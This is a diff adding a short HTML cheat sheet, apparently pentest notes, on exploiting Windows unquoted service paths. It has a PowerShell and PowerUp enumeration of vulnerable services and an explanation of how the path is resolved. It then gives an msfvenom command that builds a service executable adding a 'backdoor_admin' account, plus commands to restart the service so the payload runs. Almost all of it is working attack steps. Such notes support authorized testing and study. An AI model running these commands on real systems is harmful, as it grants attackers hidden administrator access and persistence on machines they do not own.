@@ -1,0 +1,34 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>unquoted service path</title>
+</head><body><b>Indentification</b><br/>
+<br/>
+Powershell<br/>
+<br/>
+Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name<br/>
+<br/>
+PowerUp<br/>
+<br/>
+<i>Import-Module .\PowerUp.ps1</i><br/>
+<i><b>Get-UnquotedServices</b><br/>
+</i><br/>
+Invoke-AllChecks &nbsp;--&gt; check all privesc<br/>
+<br/>
+<br/>
+<br/>
+<b>How Windows execute the program with unquoted path</b><br/>
+<i>C:\Program Files\Vuln Service\services.exe</i><br/>
+<br/>
+C:\Program.exe<br/>
+C:\Program Files\Vuln.exe<br/>
+C:\Program Files\Vuln Services\services.exe<br/>
+<br/>
+<br/>
+<br/>
+<b>Payload<br/>
+</b><i>msfvenom -p windows/adduser USER=backdoor_admin PASS=P@ssw0rd! -f exe &gt; service.exe<br/>
+<br/>
+<b>restart the services<br/>
+</b></i>net stop "Service Name" &amp; sc start "Service Name" &nbsp;</body></html>
